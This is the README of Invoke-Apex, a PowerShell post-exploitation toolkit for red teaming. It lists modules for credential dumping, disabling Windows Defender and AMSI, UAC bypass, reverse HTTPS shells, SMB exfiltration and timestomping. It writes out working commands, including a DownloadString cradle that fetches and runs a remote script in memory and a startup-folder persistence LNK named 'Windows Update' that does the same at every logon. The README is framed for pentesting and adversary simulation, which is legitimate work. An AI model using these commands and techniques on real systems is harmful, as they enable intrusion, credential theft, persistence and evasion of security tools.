# Invoke-Apex

```
                                        8888888b.         Y88b   d88P
                                        888   Y88b         Y88b d88P
                                        888    888          Y88o88P
                                8888b.  888   d88P .d88b.    Y888P
                                   "88b 8888888P" d8P  Y8b   d888b
                               .d888888 888       88888888  d88888b
                               888  888 888       Y8b.     d88P Y88b
                               "Y888888 888        "Y8888 d88P   Y88b
                                                                  Y88b
                                  Post-Exploitation Toolkit        Y88b
                                  By: Fabrizio Siciliano (@0rbz_)   V1.0
```

```Invoke-Apex``` is a PowerShell-based toolkit consisting of a collection of techniques and tradecraft for use in red team, post-exploitation, adversary simulation, or other offensive security tasks. &nbsp;It can also be useful in identifying lapses in "malicious" activity detection processes for defenders as well.

I wrote this toolkit with the intention of obtaining a deeper understanding of the techniques in use by real-world adversaries (APTs) while applying similar techniques in my work (Pentesting). &nbsp;I also wanted to create a tool that could act a starting "point" (hence "Apex") with regard to post-exploitation of a target system.  &nbsp;I'm sure there are some bugs, and some of the code could probably (very likely) be more efficient (I'm not a "developer" by any stretch of the imagination) ... but hey, it appears to serve its purpose for the time-being. ;)

Any techniques, where applicable, are credited within the source code of the included .ps1 scripts, so thanks to everyone who contributes to offensive/defensive security research!  &nbsp;If I forgot to mention or credit a technique to a particular researcher, don't hesitate to ping me and I'll add it to the source.  &nbsp;For the most part, many of the techniques were derived from [Mitre ATT&CK](https://attack.mitre.org/) and the [LOLBAS](https://lolbas-project.github.io/) projects.

If you come across an issue or something you'd like to see in the toolkit, submit an issue, PR, etc. ;)

```Invoke-Apex``` is a work-in-progress, so updates to modules, and additional capability can be expected somewhat regularly as time allows.

#### Invoke-RandomBlurb:

I was initially hesitant to release this, because for every technique I would implement and every bit of PowerShell code I would write, I'd discover there are a thousand other researchers doing it a thousand times better.

Moral of the story ... Do you. &nbsp;Share what you got. &nbsp;And a huge THANK YOU to the thousands of other toolsmiths, researchers, actual adversaries, and orgs doing similar things which served as a driving force and influence in the creation of this..."thing"...

Back to more explanations...

### The Mitre ATT&CK Reference component

Each technique or method in the toolkit is mapped back to a [Mitre ATT&CK](https://attack.mitre.org/) Technique ID where applicable, and the techniques and modules which they can be found in, can be viewed with the ```Invoke-MitreReference -Help``` command. 

```PS> Invoke-MitreReference -Help```
```
PS> Invoke-MitreReference -Help

 |------------------------------------------------------------------|
 |           ### MITRE ATT&CK TECHNIQUE REFERENCE ###               |
 |------------------------------------------------------------------|

 <...snip...>

   Module: Invoke-Creds
   --------------------
   Mitre ATT&CK Ref: T1056 (Input Capture)
   Mitre ATT&CK Ref: T1081 (Credentials in Files)
   Mitre ATT&CK Ref: T1003 (Credential Dumping)
   
   
   Module: Invoke-DefenderTools
   ----------------------------
   Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)  
   Mitre ATT&CK Ref: T1089 (Disabling Security Tools)  
   
   
   Module: Invoke-Download
   -----------------------
   Mitre ATT&CK Ref: T1105 (Remote File Copy)   
   
   
   Module: Invoke-Execute
   ----------------------
   Mitre ATT&CK Ref: T1086 (PowerShell)                            
   Mitre ATT&CK Ref: T1085 (Rundll32)                              
   Mitre ATT&CK Ref: T1047 (Windows Management Instrumentation)    
   Mitre ATT&CK Ref: T1220 (XSL Script Processing)                 
   Mitre ATT&CK Ref: T1028 (Windows Remote Management)             
   Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)  

<...snip...>
```

You can also lookup which [Mitre ATT&CK](https://attack.mitre.org/) techniques are in use, and in which modules with the ```-Tid``` parameter and specifying a Mitre ATT&CK Technique ID as a value:

```PS> Invoke-MitreReference -Tid 1352```
```
PS> Invoke-MitreReference -Tid 1352

   Modules using Mitre ATT&CK Ref: T1352 (C2 Protocol Development):

   [+] Module: Invoke-Connect
   
```

## General Usage

### Importing the Toolkit
```PS> Import-Module .\Invoke-Apex.psd1```

All individual "modules" (cmdlets) can of course also be dot-sourced into the current session:

```PS> . .\Invoke-DefenderTools.ps1```

Or can be invoked using a traditional ```DownloadString``` cradle, etc:

```C:\> powershell -ep bypass -nop -noni "iex (New-Object Net.Webclient).DownloadString('https://server/Invoke-DefenderTools.ps1'); Invoke-DefenderTools -GetExcludes"```

### Listing all available functions
```PS> Invoke-Apex```
```
PS> Invoke-Apex


                                8888888b.         Y88b   d88P
                                888   Y88b         Y88b d88P
                                888    888          Y88o88P
                        8888b.  888   d88P .d88b.    Y888P
                           "88b 8888888P" d8P  Y8b   d888b
                       .d888888 888       88888888  d88888b
                       888  888 888       Y8b.     d88P Y88b
                       "Y888888 888        "Y8888 d88P   Y88b
                                                          Y88b
                          Post-Exploitation Toolkit        Y88b
                          By: Fabrizio Siciliano (@0rbz_)   V1.0

 [*] Usage: [Function-Name] -Help (Shows Help for each command within a function)
 [*] Usage: [Function-Name] -List (Summary list of available commands within a function)

 [*] Example: Invoke-DefenderTools -Help
 [*] Example: Invoke-DefenderTools -List


CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-Apex                                        1.0        Invoke-Apex
Function        Invoke-Connect                                     1.0        Invoke-Apex
Function        Invoke-Creds                                       1.0        Invoke-Apex
Function        Invoke-DefenderTools                               1.0        Invoke-Apex
Function        Invoke-Download                                    1.0        Invoke-Apex
Function        Invoke-Execute                                     1.0        Invoke-Apex
Function        Invoke-Exfil                                       1.0        Invoke-Apex
Function        Invoke-GlasswireExceptions                         1.0        Invoke-Apex
Function        Invoke-MitreReference                              1.0        Invoke-Apex
Function        Invoke-Persistence                                 1.0        Invoke-Apex
Function        Invoke-Privesc                                     1.0        Invoke-Apex
Function        Invoke-Sysinfo                                     1.0        Invoke-Apex
Function        Invoke-TCPScan                                     1.0        Invoke-Apex
Function        Invoke-TimeStomp                                   1.0        Invoke-Apex
Function        Invoke-XuLiE                                       1.0        Invoke-Apex
Function        New-Lnk                                            1.0        Invoke-Apex
Function        New-PsDat                                          1.0        Invoke-Apex
Function        New-PsTask                                         1.0        Invoke-Apex
Function        New-Reverse                                        1.0        Invoke-Apex
```
### Getting help for a function / listing function commands
Each functions' available commands (or parameters) can be listed with the ```-Help``` parameter or with the ```-List``` parameter for a brief list of commands.

```PS> Invoke-DefenderTools -Help```
```
PS> Invoke-DefenderTools -Help

 Available Invoke-DefenderTools Commands:
 ----------------------------------------
 /----------------------------------------------------------------------/
 | -GetExcludes                                                         |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Gets any current exclude files/paths/extensions    |
 |      currently configured in Windows Defender via the Registry.      |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -GetExcludes                        |
 /----------------------------------------------------------------------/

 /----------------------------------------------------------------------/
 | -AddExclude [-Path] path                                             |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Adds a path exclude to Windows Defender.           |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp           |
 /----------------------------------------------------------------------/

 /----------------------------------------------------------------------/
 | -DisableRTM                                                          |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Disables Windows Defender Real-Time Monitoring.    |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |      Note: Will pop an alert to the end user.                        |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -DisableRtm                         |
 /----------------------------------------------------------------------/

 /----------------------------------------------------------------------/
 | -DisableAMSI                                                         |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Disables PowerShell's AMSI Hook                    |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -DisableAmsi                        |
 /----------------------------------------------------------------------/
```

```PS> Invoke-DefenderTools -List```

```
PS> Invoke-DefenderTools -List

 Invoke-DefenderTools Command List:
 ----------------------------------
 Invoke-DefenderTools -GetExcludes
 Invoke-DefenderTools -AddExclude [-Path] path
 Invoke-DefenderTools -DisableRtm
 Invoke-DefenderTools -DisableAMSI
 ```
 
 ### Usage Example (Invoke-Persistence -StartupLnk)
 
 ```PS> Invoke-Persistence -Help```
 
 ```
 PS> Invoke-Persistence -Help

 ### Invoke-Persistence HELP ###
 -------------------------------
 Available Invoke-Persistence Commands:
 --------------------------------------
 /-----------------------------------------------------------------------------/
 | -StartupLnk [-Clean] [-PsFileUrl] File_url                                  |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Drops a .LNK file in the current user's startup           |
 |      directory that executes a remotely hosted PowerShell script in         |
 |      memory (Net.WebClient DownloadString).                                 |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1060 (Registry Run Keys / Startup Folder)           |
 |     (https://attack.mitre.org/techniques/T1060/)                            |
 |                                                                             |
 |  [*] Usage: Invoke-Persistence -StartupLnk https://yourserver/script.ps1    |
 |  [*] Usage: Invoke-Persistence -StartupLnk -Clean                           |
 |      Removes startup lnk.                                                   |
 /-----------------------------------------------------------------------------/

 /-----------------------------------------------------------------------------/
 | -Adduser [-Username] username [-Password] password [-Admin] [-Delete]       |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Adds a local user. If the [-Admin] parameter is           |
 |      specified, adds an existing user to the local Administrators           |
 |      group. Use the [-Delete] param to delete a user.                       |
 |      (Requires Elevation)                                                   |
 |                                                                             |
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -password "p@a55wrd"|
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -admin              |
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -delete             |
 /-----------------------------------------------------------------------------/
```

```PS> Invoke-Persistence -StartupLnk -PsFileUrl http://192.168.42.89/script.ps1```

```
PS> Invoke-Persistence -StartupLnk -PsFileUrl http://192.168.42.89/script.ps1

### Invoke-Persistence(StartupLnk) ###

 [+] Success! "Windows Update.lnk" Installed:
        C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.lnk file.

 [+] LNK Target:
        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('http://192.168.42.89/script.ps1')"

### Invoke-Persistence(StartupLnk) ###
```

# Available Functions / Commands
## Invoke-Apex
```Invoke-Apex``` (Lists all available functions)
## Invoke-Connect
Allows for the transfer of all Invoke-Apex functionality to a remote SSL listener.

Usage: ```Invoke-Connect -lhost 192.168.1.1 -lport 443 -ssl```

## Invoke-Creds
Several commands to assist in obtaining credentials from the target host.

#### Available Commands:

```-WiFiCreds```  (Dumps saved Wireless Credentials)

```-IeCreds```    (Dumps saved IE credentials)

```-AuthPrompt``` (Invokes an authentication prompt to the target and captures any entered credentials)

```-PuttyKeys```  (Dumps any saved putty sessions/keys/passwords)

```-CopySAM```    (Utilizes Volume Shadow Copy to copy the SAM, SYSTEM and SECURITY files for offline parsing.)

```-CopyNtds```   (Utilizes Volume Shadow Copy to copy the NTDS.dit and SYSTEM files for offline parsing.)

## Invoke-DefenderTools
Several commands to assist in interacting with Windows Defender.
#### Available Commands:

```-GetExcludes``` (Gets any currently excluded files/paths/extensions from Windows Defender via the Registry)

```-AddExclude``` (Adds a Windows Defender exclude path. Requires elevation.)

```-DisableRtm``` (Disables Windows Defender Real-Time Monitoring. Requires elevation.)

```-DisableAmsi``` (Disables AMSI for the current PowerShell session.)

## Invoke-Download
Commands for downloading files to the target system.
#### Available Commands:

```-PsDownload``` (Downloads a file to the target system using a traditional powershell 'DownloadFile' cradle.)

```-CertUtil``` (Uses certutil to download a file to the target system.)

## Invoke-Execute
Execute commands on a target system using a number of different "living-off-the-land" techniques.
#### Available Commands:

```-DownloadString``` (Executes a remote powershell script in memory using the "DownloadString" method.)

```-RunDLL``` (Executes system commands or arbitrary code using a number of different "rundll32" methods.)

Available ```Invoke-Execute -Rundll``` methods:

```
       [1] shell32.dll,Control_RunDLL                      
       [2] shell32.dll,Control_RunDLLA                          
       [3] IEAdvpack.dll,RegisterOCX               
       [4] zipfldr.dll,RouteTheCall                              
       [5] advpack.dll,RegisterOCX             
       [6] pcwutl.dll,LaunchApplication   
```	   


```-WmicExec``` (Executes a local command via "wmic process call create".)

```-WmicXsl``` (Utilizes "wmic process get brief" to execute a built-in XSL stylesheet containing JScript ActiveXObject command.)

```-OdbcExec``` (Uses odbcconf.exe to execute a local DLL or DLL at a UNC path.)

```-WinRmWmi``` (Executes a command from a built-in XML file via winrm.vbs.)

```-SignedProxyDll``` (Executes a DLL via an existing signed binary.)

Available ```Invoke-Execute -SignedProxyDll``` methods:

```
       [1] AdobeARM.exe
```

```-SignedProxyExe``` (Executes an EXE via an existing signed binary.)

Available ```Invoke-Execute -SignedProxyExe``` methods:

```
       [1] pcalua.exe 
```	   

## Invoke-Exfil
Allows for moving files off of a target system to a remote system.
#### Available Commands:
```-SmbExfil``` (Copies a local file over SMB to a remote SMB Listener.)

## Invoke-GlassWireExceptions
Dumps any program exceptions configured in GlassWire Endpoint Protection software.

Usage: ```PS> Invoke-GlassWireExceptions```


## Invoke-Persistence
Several methods that allow persisting on a target system. 
#### Available Commands:
```-StartupLnk``` (Drops a .LNK file in the current user's startup directory that executes a remotely hosted PowerShell script in memory using the "DownloadString" method.)

```-Adduser``` (Adds a local user. If the ```-Admin``` parameter is specified, adds an existing user to the local Administrators group.)

```-EnableRdp``` (Enables remote desktop on the target, and adds an existing user to the Remote Desktop users group.)

## Invoke-PrivEsc
Commands for either elevating to a higher integrity-level or elevating privileges via other means.
#### Available Commands:
```-UacBypass``` (Downloads a remotely hosted DLL payload and executes a UAC bypass using CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer" Event Viewer (mmc.exe) Method.)

## Invoke-Sysinfo
Gathers information about a system. 
#### Available Commands:
```-Os```             (Displays Basic Operating System Information)

```-Env```            (Displays Environment Variables Information)

```-Drives```         (Displays current drives)

```-LocalAdmins```    (Displays local admins) 

```-DomainAdmins```   (Displays Domain Admins)

```-Privs```          (Displays current user privileges)

```-HotFixes```       (Displays installed hotfixes)  

```-CheckElevated```  (Checks if current user PS process is elevated)

```-Shares```         (Displays shared drives on the system)

```-LoggedOn```       (Displays currently interactively logged-on users)

```-Apps```           (Retrieves installed applications)

```-Procs```          (Displays current running processes)

```-Services```       (Displays current running and stopped services)

```-Tasks```          (Displays non-Microsoft scheduled tasks) 

```-Av```             (Retrieves installed AntiVirus software information)

```-LangMode```       (Checks powershell current language mode)

```-PsVersion```      (Displays PowerShell version)

```-DnsCache```       (Dumps DNS Cache)

```-PsHistory```      (Dumps PowerShell Commandline History)

```-ClipBoard```      (Dumps Clipboard Contents)

```-IpConfig```       (Displays Network Interfaces information)

```-NetStat```        (Displays Active Network Connections Information)

```-DumpAll```        (Dumps all of the above modules information into %appdata%\sysinfo.txt)

## Invoke-TcpScan
Simple TCP Port Scanner.

Usage: ```Invoke-TcpScan -IpAddress 192.168.1.1```

Note: This is a SLOW scanner, one probe every second, and ports are defined in the Invoke-TcpScan.ps1 script. The slow scanning is intentional as it helps to evade things like Symantec's Endpoint Protection firewall. The idea behind this is to generate as little noise as possible.

## Invoke-TimeStomp
Modifies a files' Creation/Modification/Last Accessed times to that of C:\windows\system32\cmd.exe on the target system.

Usage: ```Invoke-TimeStomp -File C:\programdata\file.exe```

## Invoke-XuLiE
Compiles a reverse (PowerShell) HTTPS shell .NET executable in real-time using csc.exe which utilizes ```System.Management.Automation.dll``` for its functionality. It drops the resulting executable in a randomly selected directory. Creates a .lnk in StartUp for persistence. The generated file will have a randomly-generated file name, a .dat extension and be executed via "cmd /c start file.dat". 

Requires an SSL listener on the attacker-side.

Usage: ```Invoke-XuLiE -Lhost 192.168.1.2 -Lport 443 -LnkName "Windows Update"```

## New-Lnk
Generates an LNK file with a custom command in current users' StartUp directory.

Usage: ```New-Lnk -BaseCmd "cmd.exe" -CmdArgs "/c foo" -IconNum 220 -LnkName "IE Update"```

## New-PsDat
Compiles a .NET Executable as a .dat file which takes a url to remotely hosted powershell script as an argument. Uses ```System.Management.Automation.dll``` for its functionality. Uses ```DownloadString``` method to execute remote powershell script in memory.

Generate the .dat: ```New-PsDat``` (no additional parameters)

Using the .dat: ```cmd /c eXuNt.dat https://server/script.ps1 valid_ps_function```

## New-PsTask
Generates a scheduled task that utilizes Net.Webclient Downloadstring method to a remote PowerShell script.

Usage: ```New-PsTask -PSUrl http://server/script.ps1 -TaskName "Test" -Time "00:01"```

## New-Reverse
Compiles a .NET (PowerShell) Reverse HTTPS Shell Executable. Currently only SSL listener is supported.

Usage: ```New-Reverse -Lhost 192.168.1.1 -Lport 443```

# Usage Examples

### Invoke-Creds

![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-Creds.png)

### Invoke-DefenderTools

![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-DefenderTools.png)

### Invoke-Execute
![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-Execute.png)

### Invoke-MitreReference

![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-MitreReference.png)




# DISCLAIMER
THIS SOFTWARE IS PROVIDED 'AS IS' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
